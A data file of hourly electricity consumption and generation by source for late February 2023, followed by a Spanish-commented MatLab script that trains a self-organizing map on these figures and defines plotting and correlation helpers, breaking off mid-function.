2023-02-22 04:00:00,5327,6467,1404,167,2086,1665,1087,0,57,509,2023-02-22 04:00:00,4,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 05:00:00,5600,6433,1405,151,2079,1654,1086,0,56,510,2023-02-22 05:00:00,5,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 06:00:00,6075,6546,1403,184,2135,1660,1107,0,55,511,2023-02-22 06:00:00,6,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 07:00:00,6567,6607,1405,209,2228,1590,1118,5,50,512,2023-02-22 07:00:00,7,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 08:00:00,7165,6889,1406,299,2277,1577,1132,144,52,513,2023-02-22 08:00:00,8,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 09:00:00,7258,7123,1363,419,2276,1564,1119,329,51,514,2023-02-22 09:00:00,9,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 10:00:00,7187,7139,1378,443,2217,1560,1041,449,51,515,2023-02-22 10:00:00,10,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 11:00:00,6996,7122,1385,388,2097,1597,1048,556,50,516,2023-02-22 11:00:00,11,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 12:00:00,6885,7203,1386,243,2255,1624,1029,615,50,517,2023-02-22 12:00:00,12,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 13:00:00,6818,7042,1396,144,2172,1605,1031,642,51,518,2023-02-22 13:00:00,13,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 14:00:00,6633,6902,1334,100,2187,1585,1021,623,51,519,2023-02-22 14:00:00,14,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 15:00:00,6625,6960,1367,117,2230,1643,1080,470,51,520,2023-02-22 15:00:00,15,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 16:00:00,6697,6792,1374,150,2241,1628,1077,270,50,521,2023-02-22 16:00:00,16,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 17:00:00,6833,6716,1393,181,2335,1620,1062,72,53,522,2023-02-22 17:00:00,17,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 18:00:00,7350,6896,1399,231,2505,1628,1080,0,52,523,2023-02-22 18:00:00,18,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 19:00:00,7419,7049,1396,240,2562,1643,1154,0,53,524,2023-02-22 19:00:00,19,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 20:00:00,7331,7039,1396,233,2563,1641,1154,0,53,525,2023-02-22 20:00:00,20,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 21:00:00,6915,6765,1405,241,2440,1637,991,0,52,526,2023-02-22 21:00:00,21,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 22:00:00,6484,6679,1406,246,2345,1665,965,0,51,527,2023-02-22 22:00:00,22,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 23:00:00,6011,6539,1405,220,2215,1686,961,0,52,528,2023-02-22 23:00:00,23,22,4,41,41,40,25,88,81,3,0.05
2023-02-23 00:00:00,5660,6143,1407,242,1887,1603,952,0,51,529,2023-02-23 00:00:00,0,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 01:00:00,5511,6180,1408,224,1877,1674,946,0,51,530,2023-02-23 01:00:00,1,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 02:00:00,5378,6232,1406,263,1883,1683,947,0,50,531,2023-02-23 02:00:00,2,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 03:00:00,5341,6441,1406,522,1829,1653,980,0,51,532,2023-02-23 03:00:00,3,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 04:00:00,5352,6507,1405,861,1679,1590,921,0,51,533,2023-02-23 04:00:00,4,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 05:00:00,5549,6578,1404,921,1647,1622,933,0,50,534,2023-02-23 05:00:00,5,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 06:00:00,6033,6650,1411,997,1646,1588,962,0,46,535,2023-02-23 06:00:00,6,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 07:00:00,6737,7203,1409,1452,1785,1556,942,11,47,536,2023-02-23 07:00:00,7,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 08:00:00,7384,7721,1409,1568,2017,1591,964,120,51,537,2023-02-23 08:00:00,8,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 09:00:00,7531,7766,1358,1625,1948,1556,934,291,51,538,2023-02-23 09:00:00,9,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 10:00:00,7331,7838,1357,1603,1931,1552,926,416,50,539,2023-02-23 10:00:00,10,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 11:00:00,7125,7834,1354,1587,1880,1526,929,507,50,540,2023-02-23 11:00:00,11,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 12:00:00,7137,7985,1375,1534,2007,1546,931,540,51,541,2023-02-23 12:00:00,12,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 13:00:00,7231,8075,1374,1565,2009,1599,956,521,49,542,2023-02-23 13:00:00,13,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 14:00:00,7102,8073,1352,1636,2083,1595,951,402,51,543,2023-02-23 14:00:00,14,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 15:00:00,7024,8091,1376,1555,2225,1648,970,264,51,544,2023-02-23 15:00:00,15,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 16:00:00,7095,8022,1338,1372,2328,1708,1062,160,52,545,2023-02-23 16:00:00,16,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 17:00:00,7160,8092,1345,1265,2603,1730,1039,55,54,546,2023-02-23 17:00:00,17,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 18:00:00,7495,8374,1390,1393,2758,1731,1040,8,53,547,2023-02-23 18:00:00,18,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 19:00:00,7553,8316,1391,1613,2552,1666,1040,0,53,548,2023-02-23 19:00:00,19,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 20:00:00,7426,8322,1388,1701,2547,1641,995,0,51,549,2023-02-23 20:00:00,20,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 21:00:00,7080,8285,1390,1673,2552,1651,968,0,53,550,2023-02-23 21:00:00,21,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 22:00:00,6557,8114,1393,1638,2417,1632,981,0,53,551,2023-02-23 22:00:00,22,23,5,54,47,40,18,96,59,19,0.07
2023-02-23 23:00:00,6080,7726,1390,1641,2054,1597,993,0,49,552,2023-02-23 23:00:00,23,23,5,54,47,40,18,96,59,19,0.07
2023-02-24 00:00:00,5808,7526,1388,1518,1988,1590,991,0,50,553,2023-02-24 00:00:00,0,24,6,55,43,31,22,89,67,8,0
2023-02-24 01:00:00,5648,7719,1385,1342,2138,1749,1054,0,51,554,2023-02-24 01:00:00,1,24,6,55,43,31,22,89,67,8,0
2023-02-24 02:00:00,5527,7726,1392,1374,2112,1743,1055,0,49,555,2023-02-24 02:00:00,2,24,6,55,43,31,22,89,67,8,0
2023-02-24 03:00:00,5503,7636,1398,1402,2068,1675,1042,0,50,556,2023-02-24 03:00:00,3,24,6,55,43,31,22,89,67,8,0
2023-02-24 04:00:00,5529,7514,1399,1261,2092,1677,1036,0,50,557,2023-02-24 04:00:00,4,24,6,55,43,31,22,89,67,8,0
2023-02-24 05:00:00,5714,7533,1397,1241,2121,1686,1040,0,49,558,2023-02-24 05:00:00,5,24,6,55,43,31,22,89,67,8,0
2023-02-24 06:00:00,6101,7637,1397,1404,2197,1593,1002,0,44,559,2023-02-24 06:00:00,6,24,6,55,43,31,22,89,67,8,0
2023-02-24 07:00:00,6801,8157,1400,1653,2499,1563,998,3,39,560,2023-02-24 07:00:00,7,24,6,55,43,31,22,89,67,8,0
2023-02-24 08:00:00,7384,8469,1393,1806,2531,1609,1039,48,40,561,2023-02-24 08:00:00,8,24,6,55,43,31,22,89,67,8,0
2023-02-24 09:00:00,7628,8833,1342,2136,2558,1621,1038,94,42,562,2023-02-24 09:00:00,9,24,6,55,43,31,22,89,67,8,0
2023-02-24 10:00:00,7642,9060,1334,2260,2569,1648,1042,158,48,563,2023-02-24 10:00:00,10,24,6,55,43,31,22,89,67,8,0
2023-02-24 11:00:00,7465,8990,1367,2129,2572,1636,1046,189,49,564,2023-02-24 11:00:00,11,24,6,55,43,31,22,89,67,8,0
2023-02-24 12:00:00,7399,8901,1335,1971,2613,1665,1067,197,51,565,2023-02-24 12:00:00,12,24,6,55,43,31,22,89,67,8,0
2023-02-24 13:00:00,7353,8762,1365,1949,2493,1655,1052,196,51,566,2023-02-24 13:00:00,13,24,6,55,43,31,22,89,67,8,0
2023-02-24 14:00:00,7157,8570,1334,1803,2497,1654,1043,186,50,567,2023-02-24 14:00:00,14,24,6,55,43,31,22,89,67,8,0
2023-02-24 15:00:00,6957,8334,1347,1614,2464,1629,1027,200,51,568,2023-02-24 15:00:00,15,24,6,55,43,31,22,89,67,8,0
2023-02-24 16:00:00,6920,8327,1369,1615,2564,1609,992,125,51,569,2023-02-24 16:00:00,16,24,6,55,43,31,22,89,67,8,0
2023-02-24 17:00:00,7114,8214,1381,1503,2635,1647,978,17,52,570,2023-02-24 17:00:00,17,24,6,55,43,31,22,89,67,8,0
2023-02-24 18:00:00,7411,8419,1386,1621,2770,1626,966,0,52,571,2023-02-24 18:00:00,18,24,6,55,43,31,22,89,67,8,0
2023-02-24 19:00:00,7516,8574,1381,1652,2808,1627,1052,0,54,572,2023-02-24 19:00:00,19,24,6,55,43,31,22,89,67,8,0
2023-02-24 20:00:00,7277,8499,1393,1613,2794,1607,1036,0,54,573,2023-02-24 20:00:00,20,24,6,55,43,31,22,89,67,8,0
2023-02-24 21:00:00,6896,8355,1393,1471,2789,1613,1036,0,51,574,2023-02-24 21:00:00,21,24,6,55,43,31,22,89,67,8,0
2023-02-24 22:00:00,6463,8064,1395,1310,2664,1622,1023,0,49,575,2023-02-24 22:00:00,22,24,6,55,43,31,22,89,67,8,0
2023-02-24 23:00:00,6022,7733,1397,1098,2460,1693,1035,0,48,576,2023-02-24 23:00:00,23,24,6,55,43,31,22,89,67,8,0
2023-02-25 00:00:00,5774,7281,1393,955,2187,1632,1064,0,50,577,2023-02-25 00:00:00,0,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 01:00:00,5509,7158,1399,924,1985,1725,1078,0,48,578,2023-02-25 01:00:00,1,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 02:00:00,5398,7230,1398,933,2039,1745,1068,0,47,579,2023-02-25 02:00:00,2,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 03:00:00,5358,7148,1399,974,1974,1695,1057,0,48,580,2023-02-25 03:00:00,3,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 04:00:00,5360,6990,1399,855,1939,1700,1050,0,48,581,2023-02-25 04:00:00,4,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 05:00:00,5420,6886,1398,727,1957,1703,1053,0,47,582,2023-02-25 05:00:00,5,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 06:00:00,5604,7104,1402,894,2118,1611,1030,0,48,583,2023-02-25 06:00:00,6,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 07:00:00,5828,7424,1398,985,2389,1558,1021,22,48,584,2023-02-25 07:00:00,7,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 08:00:00,6253,7621,1401,1080,2422,1526,1013,130,49,585,2023-02-25 08:00:00,8,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 09:00:00,6489,7805,1399,1183,2417,1520,1011,224,49,586,2023-02-25 09:00:00,9,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 10:00:00,6546,7816,1398,1023,2466,1571,1027,280,50,587,2023-02-25 10:00:00,10,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 11:00:00,6587,7919,1402,1053,2502,1600,1050,263,47,588,2023-02-25 11:00:00,11,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 12:00:00,6547,8158,1401,1333,2431,1657,1049,236,50,589,2023-02-25 12:00:00,12,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 13:00:00,6521,8332,1402,1856,2275,1537,1035,175,51,590,2023-02-25 13:00:00,13,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 14:00:00,6423,8508,1402,2416,2066,1491,941,141,49,591,2023-02-25 14:00:00,14,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 15:00:00,6309,8633,1403,2247,2267,1570,963,133,49,592,2023-02-25 15:00:00,15,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 16:00:00,6360,8455,1401,1715,2439,1686,1068,95,50,593,2023-02-25 16:00:00,16,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 17:00:00,6497,8432,1399,1480,2652,1739,1082,30,50,594,2023-02-25 17:00:00,17,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 18:00:00,6923,8610,1400,1577,2821,1698,1063,0,49,595,2023-02-25 18:00:00,18,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 19:00:00,7057,8530,1399,1608,2728,1701,1043,0,50,596,2023-02-25 19:00:00,19,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 20:00:00,6893,8382,1403,1529,2668,1689,1041,0,50,597,2023-02-25 20:00:00,20,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 21:00:00,6599,8147,1398,1463,2518,1685,1032,0,50,598,2023-02-25 21:00:00,21,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 22:00:00,6078,7736,1401,1538,2227,1566,953,0,50,599,2023-02-25 22:00:00,22,25,7,65,48,31,17,97,90,22,1.27
2023-02-25 23:00:00,5656,7332,1399,1255,2070,1621,937,0,48,600,2023-02-25 23:00:00,23,25,7,65,48,31,17,97,90,22,1.27
2023-02-26 00:00:00,5335,6999,1402,1022,1900,1674,953,0,48,601,2023-02-26 00:00:00,0,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 01:00:00,5156,7243,1405,1160,1981,1682,967,0,47,602,2023-02-26 01:00:00,1,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 02:00:00,5055,7036,1401,708,2152,1702,1026,0,46,603,2023-02-26 02:00:00,2,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 03:00:00,5050,7100,1398,427,2484,1682,1060,0,48,604,2023-02-26 03:00:00,3,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 04:00:00,5056,7189,1402,574,2426,1685,1054,0,46,605,2023-02-26 04:00:00,4,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 05:00:00,5086,7249,1400,984,2167,1639,1009,0,47,606,2023-02-26 05:00:00,5,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 06:00:00,5184,7235,1401,1088,2157,1537,1003,0,48,607,2023-02-26 06:00:00,6,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 07:00:00,5376,7471,1403,1326,2232,1496,965,1,47,608,2023-02-26 07:00:00,7,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 08:00:00,5639,7851,1402,1675,2300,1481,925,22,44,609,2023-02-26 08:00:00,8,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 09:00:00,5937,8010,1400,1770,2287,1484,927,94,47,610,2023-02-26 09:00:00,9,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 10:00:00,5931,8010,1404,1665,2257,1495,929,210,48,611,2023-02-26 10:00:00,10,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 11:00:00,5834,7356,1399,1695,1432,1521,947,316,44,612,2023-02-26 11:00:00,11,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 12:00:00,5713,7414,1400,1667,1424,1541,961,372,47,613,2023-02-26 12:00:00,12,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 13:00:00,5703,7550,1401,1848,1408,1519,952,371,49,614,2023-02-26 13:00:00,13,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 14:00:00,5654,7538,1399,1934,1383,1513,949,311,48,615,2023-02-26 14:00:00,14,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 15:00:00,5697,7534,1401,1953,1408,1566,969,186,49,616,2023-02-26 15:00:00,15,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 16:00:00,5848,8478,1400,2063,2309,1590,985,80,49,617,2023-02-26 16:00:00,16,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 17:00:00,6010,8469,1399,1919,2547,1573,969,12,50,618,2023-02-26 17:00:00,17,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 18:00:00,6388,8465,1399,1626,2696,1664,1031,0,50,619,2023-02-26 18:00:00,18,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 19:00:00,6623,8422,1398,1448,2736,1716,1072,0,51,620,2023-02-26 19:00:00,19,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 20:00:00,6484,8236,1399,1405,2738,1630,1001,0,50,621,2023-02-26 20:00:00,20,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 21:00:00,6225,7859,1396,1050,2706,1654,1001,0,51,622,2023-02-26 21:00:00,21,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 22:00:00,5851,7515,1398,851,2586,1642,986,0,51,623,2023-02-26 22:00:00,22,26,1,61,51,41,14,93,68,15,0.01
2023-02-26 23:00:00,5576,7437,1400,691,2577,1703,1017,0,48,624,2023-02-26 23:00:00,23,26,1,61,51,41,14,93,68,15,0.01
2023-02-27 00:00:00,5242,7156,1396,557,2387,1722,1044,0,49,625,2023-02-27 00:00:00,0,27,2,51,43,34,23,89,64,10,0
2023-02-27 01:00:00,5119,7116,1397,477,2557,1634,1001,0,49,626,2023-02-27 01:00:00,1,27,2,51,43,34,23,89,64,10,0
2023-02-27 02:00:00,5023,7027,1395,428,2518,1636,1004,0,47,627,2023-02-27 02:00:00,2,27,2,51,43,34,23,89,64,10,0
2023-02-27 03:00:00,5044,7043,1398,379,2478,1702,1036,0,48,628,2023-02-27 03:00:00,3,27,2,51,43,34,23,89,64,10,0
2023-02-27 04:00:00,5147,7035,1400,398,2474,1695,1020,0,49,629,2023-02-27 04:00:00,4,27,2,51,43,34,23,89,64,10,0
2023-02-27 05:00:00,5374,7051,1398,552,2403,1646,1000,0,48,630,2023-02-27 05:00:00,5,27,2,51,43,34,23,89,64,10,0
2023-02-27 06:00:00,6001,7274,1398,770,2420,1646,992,0,47,631,2023-02-27 06:00:00,6,27,2,51,43,34,23,89,64,10,0
2023-02-27 07:00:00,6932,7703,1400,688,2803,1668,1092,2,48,632,2023-02-27 07:00:00,7,27,2,51,43,34,23,89,64,10,0
2023-02-27 08:00:00,7579,7819,1399,493,2896,1800,1166,16,48,633,2023-02-27 08:00:00,8,27,2,51,43,34,23,89,64,10,0
2023-02-27 09:00:00,7853,7948,1365,378,3070,1804,1211,71,48,634,2023-02-27 09:00:00,9,27,2,51,43,34,23,89,64,10,0
2023-02-27 10:00:00,7913,7903,1337,347,3116,1746,1178,129,48,635,2023-02-27 10:00:00,10,27,2,51,43,34,23,89,64,10,0
2023-02-27 11:00:00,7752,7916,1373,279,3170,1722,1163,160,47,636,2023-02-27 11:00:00,11,27,2,51,43,34,23,89,64,10,0
2023-02-27 12:00:00,7638,8049,1350,608,3071,1648,1097,225,49,637,2023-02-27 12:00:00,12,27,2,51,43,34,23,89,64,10,0
2023-02-27 13:00:00,7676,8122,1368,998,2721,1649,1080,254,51,638,2023-02-27 13:00:00,13,27,2,51,43,34,23,89,64,10,0
2023-02-27 14:00:00,7528,8167,1350,1234,2658,1528,1067,279,51,639,2023-02-27 14:00:00,14,27,2,51,43,34,23,89,64,10,0
2023-02-27 15:00:00,7265,8071,1356,1137,2697,1633,960,235,51,640,2023-02-27 15:00:00,15,27,2,51,43,34,23,89,64,10,0
2023-02-27 16:00:00,7169,7890,1368,1067,2699,1600,955,147,52,641,2023-02-27 16:00:00,16,27,2,51,43,34,23,89,64,10,0
2023-02-27 17:00:00,7264,7964,1362,1184,2758,1612,982,14,50,642,2023-02-27 17:00:00,17,27,2,51,43,34,23,89,64,10,0
2023-02-27 18:00:00,7609,7916,1381,960,2832,1625,1066,0,51,643,2023-02-27 18:00:00,18,27,2,51,43,34,23,89,64,10,0
2023-02-27 19:00:00,7692,7741,1383,673,2802,1659,1169,0,52,644,2023-02-27 19:00:00,19,27,2,51,43,34,23,89,64,10,0
2023-02-27 20:00:00,7615,7705,1381,497,2864,1694,1214,0,54,645,2023-02-27 20:00:00,20,27,2,51,43,34,23,89,64,10,0
2023-02-27 21:00:00,7350,7785,1384,407,2894,1840,1208,0,51,646,2023-02-27 21:00:00,21,27,2,51,43,34,23,89,64,10,0
2023-02-27 22:00:00,6604,7596,1383,392,2863,1778,1130,0,49,647,2023-02-27 22:00:00,22,27,2,51,43,34,23,89,64,10,0
2023-02-27 23:00:00,6218,7508,1385,467,2704,1772,1132,0,48,648,2023-02-27 23:00:00,23,27,2,51,43,34,23,89,64,10,0
2023-02-28 00:00:00,5939,7418,1385,723,2402,1742,1119,0,47,649,2023-02-28 00:00:00,0,28,3,61,46,30,20,97,63,10,0
2023-02-28 01:00:00,5702,7421,1386,1094,2177,1642,1075,0,45,650,2023-02-28 01:00:00,1,28,3,61,46,30,20,97,63,10,0
2023-02-28 02:00:00,5536,7217,1381,908,2170,1678,1036,0,44,651,2023-02-28 02:00:00,2,28,3,61,46,30,20,97,63,10,0
2023-02-28 03:00:00,5543,7252,1388,801,2225,1730,1064,0,45,652,2023-02-28 03:00:00,3,28,3,61,46,30,20,97,63,10,0
2023-02-28 04:00:00,5631,7192,1398,625,2245,1740,1139,0,45,653,2023-02-28 04:00:00,4,28,3,61,46,30,20,97,63,10,0
2023-02-28 05:00:00,5911,7198,1399,733,2207,1687,1127,0,45,654,2023-02-28 05:00:00,5,28,3,61,46,30,20,97,63,10,0
2023-02-28 06:00:00,6331,7073,1401,495,2355,1642,1133,0,46,655,2023-02-28 06:00:00,6,28,3,61,46,30,20,97,63,10,0
2023-02-28 07:00:00,7005,7501,1399,405,2769,1711,1166,1,48,656,2023-02-28 07:00:00,7,28,3,61,46,30,20,97,63,10,0
2023-02-28 08:00:00,7629,7895,1400,419,2994,1823,1178,32,48,657,2023-02-28 08:00:00,8,28,3,61,46,30,20,97,63,10,0
2023-02-28 09:00:00,7982,7887,1376,458,2966,1774,1181,85,47,658,2023-02-28 09:00:00,9,28,3,61,46,30,20,97,63,10,0
2023-02-28 10:00:00,7985,7916,1383,427,2981,1782,1162,134,46,659,2023-02-28 10:00:00,10,28,3,61,46,30,20,97,63,10,0
2023-02-28 11:00:00,7887,7790,1382,337,2908,1782,1162,172,46,660,2023-02-28 11:00:00,11,28,3,61,46,30,20,97,63,10,0
2023-02-28 12:00:00,7710,7657,1374,334,2849,1706,1146,200,47,661,2023-02-28 12:00:00,12,28,3,61,46,30,20,97,63,10,0
2023-02-28 13:00:00,7692,7463,1388,299,2746,1661,1113,209,45,662,2023-02-28 13:00:00,13,28,3,61,46,30,20,97,63,10,0
2023-02-28 14:00:00,7496,7361,1393,287,2716,1645,1116,158,45,663,2023-02-28 14:00:00,14,28,3,61,46,30,20,97,63,10,0
2023-02-28 15:00:00,7417,7441,1393,295,2738,1683,1146,138,46,664,2023-02-28 15:00:00,15,28,3,61,46,30,20,97,63,10,0
2023-02-28 16:00:00,7273,7287,1391,232,2741,1643,1162,69,47,665,2023-02-28 16:00:00,16,28,3,61,46,30,20,97,63,10,0
2023-02-28 17:00:00,7382,7305,1396,129,2851,1673,1199,8,47,666,2023-02-28 17:00:00,17,28,3,61,46,30,20,97,63,10,0
2023-02-28 18:00:00,7619,7313,1396,96,2900,1677,1196,0,47,667,2023-02-28 18:00:00,18,28,3,61,46,30,20,97,63,10,0
2023-02-28 19:00:00,7719,7246,1396,74,2865,1667,1196,0,47,668,2023-02-28 19:00:00,19,28,3,61,46,30,20,97,63,10,0
2023-02-28 20:00:00,7627,7172,1396,48,2800,1684,1195,0,48,669,2023-02-28 20:00:00,20,28,3,61,46,30,20,97,63,10,0
2023-02-28 21:00:00,7221,7159,1396,42,2784,1691,1200,0,46,670,2023-02-28 21:00:00,21,28,3,61,46,30,20,97,63,10,0
2023-02-28 22:00:00,6653,6997,1398,39,2741,1656,1114,0,50,671,2023-02-28 22:00:00,22,28,3,61,46,30,20,97,63,10,0
2023-02-28 23:00:00,6343,6586,1396,39,2611,1343,1145,0,50,672,2023-02-28 23:00:00,23,28,3,61,46,30,20,97,63,10,0"
Ciept2s6,Untitled,davidcastrosalinas,MatLab,Tuesday 2nd of January 2024 09:18:01 PM CDT,"close all; clear all; clc;

%datos  = readtable('electricityConsumptionAndProductioction.csv');

%datos  = readtable('electricityConsumptionAndProductioction-enero2023.csv');
datos  = readtable('electricityConsumptionAndProductioction-enero2023-temp.csv');
%datos
%datos  = datos(2:end, :); %quitamos la primera fila
% Agrega un campo de índice
datos.Indice = (1:height(datos))';
datos.FechaHora = datetime(datos.DateTime, 'InputFormat', 'yyyy-MM-dd HH:mm:ss'); %2019-01-01 03:00:00
datos.Hora = hour(datos.FechaHora);
datos.day = day(datos.FechaHora);
datos.dayofweek =  day(datos.FechaHora, 'dayofweek');
resultadosPromedioDia = groupsummary(datos, 'Hora', 'mean');
%datos.hdd =  temperatura(datos.FechaHora);



% Guarda la tabla actualizada en un nuevo archivo CSV
%writetable(datos, 'datos_actualizados_temp.csv');
%datos = datos(2:100, :); %tomamos los primeros 100 registros

%DateTime,Consumption,Production,Nuclear,Wind,Hydroelectric,OilandGas,Coal,Solar,Biomass


%verHistograma(datos);
%graficarPorDiaFull(datos);
%graficarPromediosPorHoraFull(datos);
%graficarPorHora(datos);

%graficarPorHoraFull(datos);
%calcularCorrelacionPorHora(datos);
%graficarPorDiaMasPromedioFull(datos);
%graficarPorDayofweekFull(datos);
% Paso 3: Calcula el promedio agrupado por fecha


%graficarPorHora(resultadosPromedioDia);


%datos
%calcularCorrelacion(datos);
%Consumption
%datos.day datos.Consumption datos.Production datos.Nuclear datos.Wind datos.Hydroelectric datos.OilAndGas datos.Coal datos.Solar datos.Biomass datos.HDD

dataTrain = [datos.Hora datos.Consumption datos.Production datos.Nuclear datos.Wind datos.Hydroelectric datos.OilAndGas datos.Coal datos.Solar datos.Biomass datos.HDD];
dimension = [5 5];
epochs = 10000;
coverSteps = 100;
initNeighbor = 3;
topologyFcn = 'hextop';
distanceFcn = 'linkdist';

SOM(dataTrain, dimension, epochs, coverSteps, initNeighbor, topologyFcn, distanceFcn);



%SOM([datos.dayofweek datos.Consumption  datos.HDD], [5 5], 10000);

%SOM([datos.dayofweek datos.Consumption  datos.Production datos.Nuclear datos.Wind datos.Wind datos.HDD], [5 5], 10000);
%Consumption,Production,Nuclear,Wind,Hydroelectric,OilandGas,Coal,Solar,Biomass


%graficarPorHoraFull(datos);
%calcularCorrelacionPorHora(datos);


function SOM(data, dimensions, epochs, coverSteps, initNeighbor, topologyFcn, distanceFcn)
    dataNormalized =minMaxScaler(data, -0.5, 0.5);
    dataNormalized %visualización de los datos normalizados

    net = selforgmap(dimensions, coverSteps, initNeighbor, topologyFcn, distanceFcn)
    
    net.trainParam.epochs = epochs;
    
    % Entrenamiento SOM con datos normalizados
    net = train(net, dataNormalized');
    
    clusterAssignments = vec2ind(net(dataNormalized'));
    clusterAssignments
    % Visualización de grilla SOM
    plotsompos(net, dataNormalized');
    
    % Trazar los datos originales con grupos codificados por colores
    gscatter(dataNormalized(:,1), dataNormalized(:,2), clusterAssignments);
end



function temp = temperatura(obj1)
    temp = 1;
end 

function verHistograma() 
    histograma(datos.Consumption, 'Consumption');
    histograma(datos.Production, 'Production');
    histograma(datos.Nuclear, 'Nuclear');
    histograma(datos.Wind, 'Wind');
    histograma(datos.Hydroelectric, 'Hydroelectric');
    histograma(datos.OilAndGas, 'OilAndGas');
    histograma(datos.Coal, 'Coal');
    histograma(datos.Solar, 'Solar');
    histograma(datos.Biomass, 'Biomass');
end 

function calcularCorrelacion(datos)
    % Seleccionar columnas de interés

    %DateTime          Consumption    Production    Nuclear    Wind    Hydroelectric    OilAndGas    Coal    Solar    Biomass    Indice         FechaHora         Hora
    columnas_de_interes = [2, 3, 4, 5, 6, 7, 8, 9, 10, 13];
    datos_seleccionados = datos(:, columnas_de_interes);
    
    % Calcular la matriz de correlación para las columnas seleccionadas
    matriz_correlacion = corr(datos_seleccionados{:,:});
    
    % Visualizar la matriz de correlación
    disp('Matriz de correlación para columnas seleccionadas:');
    disp(matriz_correlacion);
end 


function calcularCorrelacionPorHora(datos)
    %DateTime          Consumption    Production    Nuclear    Wind    Hydroelectric    OilAndGas    Coal    Solar    Biomass    Indice         FechaHora         Hora
    columnas_de_interes = [2 19];
    datos_seleccionados = datos(:, columnas_de_interes);
    datos_seleccionados
    [matriz_correlacion p] = corr(datos_seleccionados{:,:});
    
    % Visualizar la matriz de correlación
    disp('Matriz de correlación para columnas seleccionadas:');
    disp(matriz_correlacion);
    disp('Valores p:');
    disp(p);
end 


function graficarPorHora(datos) 
    figure;
    plot(datos.Hora, datos.mean_Consumption, 'o-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold on;
    plot(datos.Hora, datos.mean_Production, 's-', 'LineWidth', 2, 'DisplayName', 'Dato2');
    hold off;
    xlabel('Hora de la Semana');
    ylabel('Energía');
    legend('Consumption', 'Production'); 
end

function graficarPorDia(datos) 
    figure;
    datosFecha = datetime(datos.DateTime, 'InputFormat', 'yyyy-MM-dd HH:mm:ss'); %2019-01-01 03:00:00
    datos.Hora = hour(datos.Fecha);
    plot(datosFecha, datos.Consumption, 'o-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold on;
